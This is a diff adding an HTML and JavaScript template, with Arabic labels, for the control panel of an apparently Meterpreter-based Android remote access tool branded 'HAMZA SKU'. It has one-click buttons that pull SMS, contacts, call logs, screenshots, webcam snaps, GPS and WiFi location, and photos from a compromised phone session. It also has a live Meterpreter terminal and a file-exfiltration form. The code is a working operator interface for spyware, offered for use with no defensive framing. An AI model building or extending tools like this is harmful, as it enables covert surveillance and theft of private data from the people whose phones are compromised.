@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HAMZA SKU - Session {{ session_id }}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0e1a, #1a1e2e);
+            color: #e0e6ed;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        
+        h1 {
+            text-align: center;
+            color: #00ff88;
+            font-size: 36px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+        }
+        
+        .btn-back {
+            display: inline-block;
+            padding: 12px 25px;
+            background: linear-gradient(135deg, #0088ff, #0066cc);
+            color: white;
+            text-decoration: none;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            transition: 0.3s;
+        }
+        
+        .btn-back:hover {
+            transform: translateY(-2px);
+        }
+        
+        .card {
+            background: rgba(20, 24, 36, 0.95);
+            border: 2px solid rgba(0, 255, 136, 0.3);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 20px;
+        }
+        
+        .card-title {
+            color: #00ff88;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 12px;
+        }
+        
+        .quick-btn {
+            padding: 15px;
+            background: linear-gradient(135deg, #00ff88, #00cc66);
+            border: none;
+            border-radius: 12px;
+            color: #0a0e1a;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .quick-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 255, 136, 0.4);
+        }
+        
+        .quick-btn:active {
+            transform: translateY(0);
+        }
+        
+        .terminal {
+            background: #000;
+            border: 2px solid #00ff88;
+            border-radius: 12px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            max-height: 450px;
+            overflow-y: auto;
+            margin-bottom: 15px;
+        }
+        
+        .terminal-output {
+            color: #00ff88;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+        
+        .command-input {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .command-input input {
+            flex: 1;
+            padding: 14px;
+            background: #000;
+            border: 2px solid #00ff88;
+            border-radius: 10px;
+            color: #00ff88;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        
+        .command-input input:focus {
+            outline: none;
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+        
+        .command-input button {
+            padding: 14px 30px;
+            background: #00ff88;
+            border: none;
+            border-radius: 10px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .command-input button:hover {
+            transform: scale(1.05);
+        }
+        
+        .download-section {
+            margin-top: 20px;
+        }
+        
+        .download-input {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .download-input input {
+            flex: 1;
+            padding: 12px;
+            background: rgba(10, 14, 26, 0.8);
+            border: 2px solid rgba(0, 255, 136, 0.3);
+            border-radius: 10px;
+            color: #e0e6ed;
+        }
+        
+        .btn-download {
+            padding: 12px 25px;
+            background: linear-gradient(135deg, #ff8800, #cc6600);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .downloads-list {
+            background: rgba(10, 14, 26, 0.6);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .download-item {
+            padding: 10px;
+            margin: 5px 0;
+            background: rgba(0, 255, 136, 0.1);
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .download-item a {
+            color: #00ff88;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .download-item a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 Session #{{ session_id }}</h1>
+        
+        <a href="/dashboard" class="btn-back">⬅️ رجوع للـ Dashboard</a>
+        
+        <div class="card">
+            <div class="card-title">⚡ أوامر سريعة</div>
+            <div class="quick-actions">
+                <button class="quick-btn" onclick="runQuick('sysinfo')">💻 System Info</button>
+                <button class="quick-btn" onclick="runQuick('run post/multi/gather/geolocate')">📍 Location</button>
+                <button class="quick-btn" onclick="runQuick('screenshot')">📸 Screenshot</button>
+                <button class="quick-btn" onclick="runQuick('webcam_snap')">📷 Webcam</button>
+                <button class="quick-btn" onclick="runQuick('dump_sms')">💬 Get SMS</button>
+                <button class="quick-btn" onclick="runQuick('dump_contacts')">📞 Contacts</button>
+                <button class="quick-btn" onclick="runQuick('dump_calllog')">📱 Call Log</button>
+                <button class="quick-btn" onclick="runQuick('app_list')">📱 App List</button>
+                <button class="quick-btn" onclick="runQuick('check_root')">🔓 Check Root</button>
+                <button class="quick-btn" onclick="runQuick('wlan_geolocate')">📡 WiFi Location</button>
+                <button class="quick-btn" onclick="runQuick('pwd')">📁 Current Dir</button>
+                <button class="quick-btn" onclick="runQuick('ls /sdcard/')">📂 List Files</button>
+                <button class="quick-btn" onclick="runQuick('ls /sdcard/DCIM/')">📷 Photos</button>
+                <button class="quick-btn" onclick="runQuick('ps')">⚙️ Processes</button>
+                <button class="quick-btn" onclick="runQuick('ifconfig')">🌐 Network</button>
+                <button class="quick-btn" onclick="runQuick('getuid')">👤 User ID</button>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">💻 Terminal</div>
+            <div class="terminal">
+                <div class="terminal-output" id="output">📡 Meterpreter Terminal Ready
+> Type commands or use quick actions above
+
+</div>
+            </div>
+            <div class="command-input">
+                <input type="text" id="command" placeholder="اكتب أمر Meterpreter..." onkeypress="if(event.key==='Enter') runCommand()">
+                <button onclick="runCommand()">تنفيذ</button>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">📥 تحميل الملفات</div>
+            <div class="download-section">
+                <div class="download-input">
+                    <input type="text" id="file-path" placeholder="مسار الملف مثل: /sdcard/photo.jpg">
+                    <button class="btn-download" onclick="downloadFile()">⬇️ تحميل</button>
+                </div>
+                
+                <div class="downloads-list" id="downloads-list">
+                    <div style="text-align: center; color: #8b95a8;">لا توجد تحميلات بعد</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const sessionId = '{{ session_id }}';
+        let downloads = [];
+        
+        async function runCommand() {
+            const input = document.getElementById('command');
+            const cmd = input.value.trim();
+            
+            if (!cmd) return;
+            
+            addOutput(`\n[HAMZA] > ${cmd}\n`);
+            input.value = '';
+            
+            try {
+                const res = await fetch('/api/command', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        session_id: sessionId,
+                        command: cmd
+                    })
+                });
+                
+                const data = await res.json();
+                
+                if (data.success) {
+                    addOutput(data.output + '\n');
+                } else {
+                    addOutput(`[ERROR] ${data.output}\n`, 'error');
+                }
+            } catch (e) {
+                addOutput(`[ERROR] ${e}\n`, 'error');
+            }
+        }
+        
+        async function runQuick(cmd) {
+            addOutput(`\n[HAMZA] > ${cmd}\n`);
+            
+            try {
+                const res = await fetch('/api/command', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        session_id: sessionId,
+                        command: cmd
+                    })
+                });
+                
+                const data = await res.json();
+                
+                if (data.success) {
+                    addOutput(data.output + '\n');
+                } else {
+                    addOutput(`[ERROR] ${data.output}\n`, 'error');
+                }
+            } catch (e) {
+                addOutput(`[ERROR] ${e}\n`, 'error');
+            }
+        }
+        
+        async function downloadFile() {
+            const path = document.getElementById('file-path').value.trim();
+            
+            if (!path) {
+                alert('الرجاء إدخال مسار الملف');
+                return;
+            }
+            
+            addOutput(`\n[DOWNLOAD] Downloading: ${path}\n`);
+            
+            try {
+                // استخدام أمر download في Meterpreter
+                const res = await fetch('/api/command', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        session_id: sessionId,
+                        command: `download "${path}"`
+                    })
+                });
+                
+                const data = await res.json();
+                
+                if (data.success) {
+                    addOutput(`[SUCCESS] File downloaded!\n`);
+                    addOutput(data.output + '\n');
+                    
+                    // إضافة للقائمة
+                    const filename = path.split('/').pop();
+                    addDownloadToList(filename, path);
+                    
+                    document.getElementById('file-path').value = '';
+                } else {
+                    addOutput(`[ERROR] ${data.output}\n`, 'error');
+                }
+            } catch (e) {
+                addOutput(`[ERROR] ${e}\n`, 'error');
+            }
+        }
+        
+        function addDownloadToList(filename, path) {
+            const listDiv = document.getElementById('downloads-list');
+            
+            if (downloads.length === 0) {
+                listDiv.innerHTML = '';
+            }
+            
+            downloads.push({filename, path, time: new Date().toLocaleTimeString('ar-SA')});
+            
+            listDiv.innerHTML = downloads.map((d, i) => `
+                <div class="download-item">
+                    <span>📁 ${d.filename} - ${d.time}</span>
+                    <span style="color: #8b95a8; font-size: 12px;">${d.path}</span>
+                </div>
+            `).join('');
+        }
+        
+        function addOutput(text, type = 'normal') {
+            const output = document.getElementById('output');
+            
+            if (output.textContent.includes('Meterpreter Terminal Ready')) {
+                output.textContent = '';
+            }
+            
+            const span = document.createElement('span');
+            span.textContent = text;
+            
+            if (type === 'error') {
+                span.style.color = '#ff0055';
+            }
+            
+            output.appendChild(span);
+            output.parentElement.scrollTop = output.parentElement.scrollHeight;
+        }
+        
+        // Focus on command input
+        document.getElementById('command').focus();
+    </script>
+</body>
+</html>
